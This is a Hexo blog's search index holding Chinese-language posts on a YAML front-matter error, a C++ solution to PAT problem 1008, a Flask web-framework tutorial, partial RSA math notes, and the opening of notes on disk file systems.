<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>使用hexo发布文章报错can not read a block mapping entry</title>
      <link href="/2021/01/14/shi-yong-hexo-fa-bu-wen-zhang-bao-cuo-can-not-read-a-block-mapping-entry/"/>
      <url>/2021/01/14/shi-yong-hexo-fa-bu-wen-zhang-bao-cuo-can-not-read-a-block-mapping-entry/</url>
      
        <content type="html"><![CDATA[<p>之前有几篇文章没有传上去</p><p>然后没有注意报错，这次想彻底的改变自己的一些懒散的性格23333</p><p>踩坑如下：</p><p>之前的文章的tag以及category没有在冒号之后加空格进行了报错</p><pre><code>title: 使用hexo发布文章报错can not read a block mapping entrytop: falsetags:亿点小细节categories:亿点小细节</code></pre><blockquote><p> can not read a block mapping entry; a multiline key may not be an implicit key at line X, column X</p></blockquote><p>后面添加空格之后即可解决</p><p>当然还有师傅的也是有报错</p><p>有可能是文件名里面出现了英文字符的双引号，导致yaml语法解析出错，将英文双引号修改成中文双引号即可修复</p><p>今日份踩坑2333</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 亿点小细节 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 亿点小细节 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PAT甲级1008</title>
      <link href="/2021/01/14/pat-jia-ji-1008/"/>
      <url>/2021/01/14/pat-jia-ji-1008/</url>
      
        <content type="html"><![CDATA[<h2 id="1008-Elevator-20分"><a href="#1008-Elevator-20分" class="headerlink" title="1008 Elevator (20分)"></a>1008 Elevator (20分)</h2><p>The highest building in our city has only one elevator. A request list is made up with <em>N</em> positive numbers. The numbers denote at which floors the elevator will stop, in specified order. It costs 6 seconds to move the elevator up one floor, and 4 seconds to move down one floor. The elevator will stay for 5 seconds at each stop.</p><p>For a given request list, you are to compute the total time spent to fulfill the requests on the list. The elevator is on the 0th floor at the beginning and does not have to return to the ground floor when the requests are fulfilled.</p><h3 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h3><p>Each input file contains one test case. Each case contains a positive integer <em>N</em>, followed by <em>N</em> positive numbers. All the numbers in the input are less than 100.</p><h3 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h3><p>For each test case, print the total time on a single line.</p><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h3><pre class=" language-in"><code class="language-in">3 2 3 1</code></pre><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h3><pre class=" language-out"><code class="language-out">41</code></pre><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>难度：签到题</p><p>读懂题目即可</p><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>输入：即将输入的楼层数量，然后依次楼层数</p><p>输出：共耗时</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>题目意思：</p><p>一栋楼有个电梯，上一层要6s，下一层要4s，停住的时候要5s，刚开始在1楼，请问抵达最后输入的楼层需要几秒钟，然后不需要抵达一楼（感觉应该是要停下来的）</p><h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a>代码如下：</h3><pre class=" language-c++"><code class="language-c++">#include<iostream>using namespace std;int main()&#123;    int n,pre=0,next,time=0;//n表示输入有几个输入数字，pre表示前面的楼层，next是接下来的要去的楼层，time是叠加     cin >> n;//输入有几层楼     for(int i=0; i < n; i++)&#123;        cin >> next;        if(next > pre)&#123;            int min = next - pre;            time = time + min*6;        &#125;        else&#123;            int min  = pre - next;            time = time + min*4;        &#125;        pre = next;        time +=5 ;//        cout << time << " " << "第"<< i <<"次" << endl;    &#125;    cout << time <<endl;     return 0;&#125;</code></pre><p>emmm就结束了23333</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PAT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask框架开发</title>
      <link href="/2021/01/01/flask-kuang-jia-kai-fa/"/>
      <url>/2021/01/01/flask-kuang-jia-kai-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h2><p><img src="1.png"></p><h2 id="flask路由注册："><a href="#flask路由注册：" class="headerlink" title="flask路由注册："></a>flask路由注册：</h2><p>app.route 和app.add_url_rule</p><p>蓝图</p><h3 id="app-route-和app-add-url-rule"><a href="#app-route-和app-add-url-rule" class="headerlink" title="app.route 和app.add_url_rule"></a>app.route 和app.add_url_rule</h3><p>@：装饰器加方法</p><p>route路由里面可以加参数：</p><pre><code>@app.route('/my/&lt;username&gt;')</code></pre><p>示例代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello World!'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/my/&lt;username>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"my love is:user %s"</span> <span class="token operator">%</span> username<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>route底层函数：</p><p><img src="2.png"></p><p>路由就是分发，传递</p><p><a href="http://127.0.0.1:5000/my">http://127.0.0.1:5000/my</a></p><blockquote><p>http 协议</p><p>host 127.0.0.1</p><p>port 5000</p><p>path /my</p></blockquote><pre><code>@app.add_url_rule():#绑定视图</code></pre><p>示例如下：注意要把之前的要注释掉</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># @app.route('/')</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello World!'</span><span class="token comment" spellcheck="true"># @app.route('/my/&lt;username>')</span><span class="token keyword">def</span> <span class="token function">my</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"my love is: %s"</span> <span class="token operator">%</span> usernameapp<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span>rule<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">,</span> view_func<span class="token operator">=</span>hello_world<span class="token punctuation">)</span>app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span>rule<span class="token operator">=</span><span class="token string">"/my/&lt;username>"</span><span class="token punctuation">,</span> view_func<span class="token operator">=</span>my<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>但大部分会使用</p><p>app.route符合从上到下编程的习惯，而app.add_url_rule的话会更加繁琐</p><p>但是在开发过程中，使用蓝图会更为普遍</p><h3 id="蓝图"><a href="#蓝图" class="headerlink" title="蓝图"></a>蓝图</h3><p>优点：易于分层管理</p><p>会将蓝图control跟蓝图注册进行分开</p><p>构建两个文件：application.py和indexcontroller.py</p><p>application.py内容如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Blueprint<span class="token keyword">from</span> indexcontroller <span class="token keyword">import</span> index_pageapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>index_page<span class="token punctuation">,</span> url_prefix<span class="token operator">=</span><span class="token string">"/mylove"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>indexcontroller.py内容如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Blueprintindex_page <span class="token operator">=</span> Blueprint<span class="token punctuation">(</span><span class="token string">"index_page"</span><span class="token punctuation">,</span> __name__<span class="token punctuation">)</span>@index_page<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index_page_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"index_page"</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/mylove"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">love</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"I love you"</span></code></pre><h2 id="Http请求"><a href="#Http请求" class="headerlink" title="Http请求"></a>Http请求</h2><p><img src="3.png"></p><p>DNS解析：根据域名获取到IP</p><p>HTTP请求</p><p>HTTP响应</p><h3 id="GET请求与POST请求"><a href="#GET请求与POST请求" class="headerlink" title="GET请求与POST请求"></a>GET请求与POST请求</h3><p>POST上传文件注意事项</p><p><code>enctype = "multipart/form-data"</code></p><h4 id="GET请求："><a href="#GET请求：" class="headerlink" title="GET请求："></a>GET请求：</h4><pre class=" language-python"><code class="language-python">@index_page<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/get"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    var_a <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"I love"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"request:%s,params:%s,var_a:%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>method<span class="token punctuation">,</span>request<span class="token punctuation">.</span>args<span class="token punctuation">,</span>var_a<span class="token punctuation">)</span></code></pre><p>get方法的底层函数：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> default<span class="token operator">=</span>None<span class="token punctuation">,</span> type<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Return the default value if the requested data doesn't exist.    If `type` is provided and is a callable it should convert the value,    return it or raise a :exc:`ValueError` if that is not possible.  In    this case the function will return the default as if the value was not    found:    >>> d = TypeConversionDict(foo='42', bar='blub')    >>> d.get('foo', type=int)    42    >>> d.get('bar', -1, type=int)    -1    :param key: The key to be looked up.    :param default: The default value to be returned if the key can't                    be looked up.  If not further specified `None` is                    returned.    :param type: A callable that is used to cast the value in the                 :class:`MultiDict`.  If a :exc:`ValueError` is raised                 by this callable the default value is returned.    """</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> self<span class="token punctuation">[</span>key<span class="token punctuation">]</span>    <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>        <span class="token keyword">return</span> default    <span class="token keyword">if</span> type <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> type<span class="token punctuation">(</span>rv<span class="token punctuation">)</span>        <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>            rv <span class="token operator">=</span> default    <span class="token keyword">return</span> rv</code></pre><h4 id="POST请求："><a href="#POST请求：" class="headerlink" title="POST请求："></a>POST请求：</h4><p>有两种if的写法，但是要注意写post时候一定要写if，否则会报错，同时在这里提醒在上线的时候一定要记得要把debug模式关掉</p><pre class=" language-python"><code class="language-python">@index_page<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/post"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#三元表达式</span>    var_a <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"a"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form <span class="token keyword">else</span> <span class="token string">''</span><span class="token comment" spellcheck="true">#常用为一行</span>    <span class="token comment" spellcheck="true">#普通容易看懂</span>    <span class="token comment" spellcheck="true"># var_a = ""</span>    <span class="token comment" spellcheck="true"># if 'a' in request.form:</span>    <span class="token comment" spellcheck="true">#     var_a = request.form['a']</span>    <span class="token comment" spellcheck="true"># return "ok"</span>    <span class="token comment" spellcheck="true"># var_a = request.args.get("a","I love Y")</span>    <span class="token keyword">return</span> <span class="token string">"request:%s,params:%s,var_a:%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>method<span class="token punctuation">,</span>request<span class="token punctuation">.</span>form<span class="token punctuation">,</span>var_a<span class="token punctuation">)</span></code></pre><p>POST方法的底层函数（看的是form）：</p><pre class=" language-python"><code class="language-python">@cached_property<span class="token keyword">def</span> <span class="token function">form</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""The form parameters.  By default an    :class:`~werkzeug.datastructures.ImmutableMultiDict`    is returned from this function.  This can be changed by setting    :attr:`parameter_storage_class` to a different type.  This might    be necessary if the order of the form data is important.    Please keep in mind that file uploads will not end up here, but instead    in the :attr:`files` attribute.    .. versionchanged:: 0.9        Previous to Werkzeug 0.9 this would only contain form data for POST        and PUT requests.    """</span>    self<span class="token punctuation">.</span>_load_form_data<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> self<span class="token punctuation">.</span>form</code></pre><h4 id="REQUEST请求："><a href="#REQUEST请求：" class="headerlink" title="REQUEST请求："></a>REQUEST请求：</h4><p>两种合并为一种的时候用REQUEST请求：</p><p>查看REQUEST的底层代码：</p><pre class=" language-python"><code class="language-python">@cached_property<span class="token keyword">def</span> <span class="token function">values</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A :class:`werkzeug.datastructures.CombinedMultiDict` that combines    :attr:`args` and :attr:`form`."""</span>    args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> d <span class="token keyword">in</span> self<span class="token punctuation">.</span>args<span class="token punctuation">,</span> self<span class="token punctuation">.</span>form<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> isinstance<span class="token punctuation">(</span>d<span class="token punctuation">,</span> MultiDict<span class="token punctuation">)</span><span class="token punctuation">:</span>            d <span class="token operator">=</span> MultiDict<span class="token punctuation">(</span>d<span class="token punctuation">)</span>        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span>d<span class="token punctuation">)</span>    <span class="token keyword">return</span> CombinedMultiDict<span class="token punctuation">(</span>args<span class="token punctuation">)</span></code></pre><p>二者均可使用，只需要添加即可</p><h3 id="文件上传："><a href="#文件上传：" class="headerlink" title="文件上传："></a>文件上传：</h3><p>reques.files函数</p><p>查看底层代码：</p><pre class=" language-python"><code class="language-python">@cached_property<span class="token keyword">def</span> <span class="token function">files</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">""":class:`~werkzeug.datastructures.MultiDict` object containing    all uploaded files.  Each key in :attr:`files` is the name from the    ``&lt;input type="file" name="">``.  Each value in :attr:`files` is a    Werkzeug :class:`~werkzeug.datastructures.FileStorage` object.    It basically behaves like a standard file object you know from Python,    with the difference that it also has a    :meth:`~werkzeug.datastructures.FileStorage.save` function that can    store the file on the filesystem.    Note that :attr:`files` will only contain data if the request method was    POST, PUT or PATCH and the ``&lt;form>`` that posted to the request had    ``enctype="multipart/form-data"``.  It will be empty otherwise.    See the :class:`~werkzeug.datastructures.MultiDict` /    :class:`~werkzeug.datastructures.FileStorage` documentation for    more details about the used data structure.    """</span>    self<span class="token punctuation">.</span>_load_form_data<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> self<span class="token punctuation">.</span>files</code></pre><p>构造代码如下：</p><pre class=" language-python"><code class="language-python">@index_page<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"file"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files <span class="token keyword">else</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"request:%s,params:%s,file:%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>method<span class="token punctuation">,</span> request<span class="token punctuation">.</span>files<span class="token punctuation">,</span>f<span class="token punctuation">)</span></code></pre><h3 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h3><p>在同时有post和get方法时，同时值一致，最后该值的赋值为get传值还是post传值呢？</p><p>（最后赋值的为post传值）</p><h2 id="FLASK响应"><a href="#FLASK响应" class="headerlink" title="FLASK响应"></a>FLASK响应</h2><p>三种</p><p>text/html</p><p>响应JSON</p><p>模板响应</p><h4 id="响应JSON"><a href="#响应JSON" class="headerlink" title="响应JSON"></a>响应JSON</h4><p>第一种，不常用</p><pre class=" language-python"><code class="language-python">@index_page<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/json"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> json    data <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"a": "b"&amp;#125;</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># response.headers["Content-Type"] = "application/json"</span>    <span class="token keyword">return</span> response</code></pre><p>第二种</p><pre class=" language-python"><code class="language-python">@index_page<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/json_same"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">json_same</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#    import json</span>    data <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"a": "b"&amp;#125;</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>jsonify <span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#默认自动设置头部，做了集成</span>    <span class="token keyword">return</span> response</code></pre><h4 id="模板响应"><a href="#模板响应" class="headerlink" title="模板响应"></a>模板响应</h4><pre class=" language-python"><code class="language-python">@index_page<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/template"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span></code></pre><p>在文件夹底下有templates文件夹</p><p>读取其中的文件</p><p>采用jinjia2的模板引擎进行渲染</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>template_name_or_list<span class="token punctuation">,</span> <span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Renders a template from the template folder with the given    context.    :param template_name_or_list: the name of the template to be                                  rendered, or an iterable with template names                                  the first one existing will be rendered    :param context: the variables that should be available in the                    context of the template.    """</span>    ctx <span class="token operator">=</span> _app_ctx_stack<span class="token punctuation">.</span>top    ctx<span class="token punctuation">.</span>app<span class="token punctuation">.</span>update_template_context<span class="token punctuation">(</span>context<span class="token punctuation">)</span>    <span class="token keyword">return</span> _render<span class="token punctuation">(</span>        ctx<span class="token punctuation">.</span>app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>get_or_select_template<span class="token punctuation">(</span>template_name_or_list<span class="token punctuation">)</span><span class="token punctuation">,</span>        context<span class="token punctuation">,</span>        ctx<span class="token punctuation">.</span>app<span class="token punctuation">,</span>    <span class="token punctuation">)</span></code></pre><p>同时在使用jinjia2模板的时候，注意此时有底层函数的一些作用，使用不当可能会产生ssti注入的一些危险应用</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA学习</title>
      <link href="/2020/11/23/rsa-xue-xi/"/>
      <url>/2020/11/23/rsa-xue-xi/</url>
      
        <content type="html"><![CDATA[<p>密码学为了做实验，菜鸡不得不好好学了一下RSA，然后被身边的密码学师傅带飞</p><h3 id="RSA加解密实现"><a href="#RSA加解密实现" class="headerlink" title="RSA加解密实现"></a>RSA加解密实现</h3><p>RSA历史：</p><p>非对称加密</p><p>有空补上</p><p>RSA算法的数学基础：</p><p>1.互质</p><p>如果两个或两个以上的正整数的最大公约数是 1，则称它们为<strong>互质</strong></p><p>2.欧拉函数</p><p><strong>欧拉函数</strong> <em>φ(n)<em>是小于或等于</em>n</em>的正整数中与<em>n</em>互质的数的数目。</p><p><strong>推导欧拉函数:</strong></p><p>（1）如果<em>n = 1</em>, <em>φ(1) = 1</em>；(小于等于1的正整数中唯一和1互质的数就是1本身)；</p><p>（2）如果<em>n</em>为质数，<em>φ(n) = n - 1</em>；因为质数和每一个比它小的数字都互质。比如5，比它小的正整数1,2,3,4都和他互质；</p><p>(3) 如果<em>n</em>是<em>a</em>的<em>k</em>次幂，则 *φ(n) = φ(a^k) = a^k - a^(k-1) = (a-1)a^(k-1)*；</p><p>(4) 若<em>m</em>,<em>n</em>互质，则φ(m*n) = φ(m)φ(n)</p><p><strong>模反元素</strong></p><p>如果两个正整数a和n互质，那么一定可以找到整数<em>b</em>，使得 ab-1 被n整除，或者说ab被n除的余数是1。</p><p><strong>欧拉定理</strong></p><p>如果两个正整数<em>a</em>和<em>n</em>互质，则<em>n</em>的欧拉函数 <em>φ(n)</em> 可以让下面的等式成立：<br><em>a^φ(n) = 1(mod n)</em><br>由此可得：<em>a</em>的<em>φ(n - 1)<em>次方肯定是</em>a</em>关于<em>n</em>的模反元素。</p><p><strong>费马小定理</strong></p><p>假设正整数a与质数p互质，因为质数p的<em>φ(p)<em>等于</em>p-1</em>，则欧拉定理可以写成<br><em>a^(p-1) = 1 (mod p)</em><br>这其实是欧拉定理的一个特例。</p><p>RSA算法的过程：</p><p>1.寻找2个不同的质数p和q（随机寻找）</p><p>2.计算p和q的乘积n</p><p>3.计算欧拉函数φ(n) </p><p>φ(n) = (p-1)(q-1)</p><p>4.随机选择一个小于φ(n)并且与φ(n) 互质的整数e</p><p>5.计算e对于φ(n)的模反元素d</p><p>6.将n和e封装成公钥，n和d封装成私钥</p><p>总结：计算n，e，d的过程</p><h3 id="RSA代码实现"><a href="#RSA代码实现" class="headerlink" title="RSA代码实现"></a>RSA代码实现</h3><p>1.首先是随机寻找两个不同的质数：</p><h3 id="CTF中一些RSA攻击总结"><a href="#CTF中一些RSA攻击总结" class="headerlink" title="CTF中一些RSA攻击总结"></a>CTF中一些RSA攻击总结</h3><p>引用：</p><p><a href="https://zhuanlan.zhihu.com/p/33580225">https://zhuanlan.zhihu.com/p/33580225</a></p><p><a href="https://www.cnblogs.com/jcchan/p/8412819.html">https://www.cnblogs.com/jcchan/p/8412819.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/84013522">https://zhuanlan.zhihu.com/p/84013522</a></p><p><a href="https://blog.csdn.net/chroje/article/details/79477329?utm_source=blogkpcl1">https://blog.csdn.net/chroje/article/details/79477329?utm_source=blogkpcl1</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件系统与文件存储</title>
      <link href="/2020/09/12/wen-jian-xi-tong-yu-wen-jian-cun-chu/"/>
      <url>/2020/09/12/wen-jian-xi-tong-yu-wen-jian-cun-chu/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近在看书，就当写读书笔记了</p></blockquote><h2 id="一、常见磁盘分区格式"><a href="#一、常见磁盘分区格式" class="headerlink" title="一、常见磁盘分区格式"></a>一、常见磁盘分区格式</h2><h3 id="1-FAT16"><a href="#1-FAT16" class="headerlink" title="1.FAT16"></a>1.FAT16</h3><h4 id="常见地方："><a href="#常见地方：" class="headerlink" title="常见地方："></a>常见地方：</h4><p>MS-DOS及老版本的WINDOWS95</p><p>采用16位的磁盘分区表</p><p>最大支持2GB的磁盘分区，读取速率上升</p><h4 id="独特优点："><a href="#独特优点：" class="headerlink" title="独特优点："></a>独特优点：</h4><p>几乎所有操作系统都支持该分区模式（DOS、 WINDOWS 95/95/NT/Linux）</p><h4 id="缺点明显："><a href="#缺点明显：" class="headerlink" title="缺点明显："></a>缺点明显：</h4><p>磁盘利用效率较低：磁盘文件以簇为单位分配，一个簇只能分配给一个文件（即使改文件只有一个字节，也需占用一个簇）</p><h3 id="2-FAT32"><a href="#2-FAT32" class="headerlink" title="2.FAT32"></a>2.FAT32</h3><h4 id="常见："><a href="#常见：" class="headerlink" title="常见："></a>常见：</h4><p>Windows95 OSR2（WIn97）</p><p>32位文件分配表</p><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><p>1.解决了FAT16的缺点，采用32位的文件分配表，突破FAT16的对磁盘分区容量的限制</p><p>2.在一个分区不超过8GB的前提下，FAT32分区的每个簇都是都固定为4KB–&gt;比FAT16小很多</p><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><p>1.兼容性不太好（DOS和Linux都不兼容）</p><p>2.文件分配表变大，运行速度变慢（Windows的图像界面反应不明显，在安全模式 or MS-DOS状态下将会显示）</p><p>3.FAT32在某些磁盘操作方式上对系统进行了修改（使得某些常规磁盘炒作不能继续进行）</p><h3 id="3-NTFS"><a href="#3-NTFS" class="headerlink" title="3.NTFS"></a>3.NTFS</h3><h4 id="常见：-1"><a href="#常见：-1" class="headerlink" title="常见："></a>常见：</h4><p>Windows NT(2000/xp/vista)</p><h4 id="优点：-1"><a href="#优点：-1" class="headerlink" 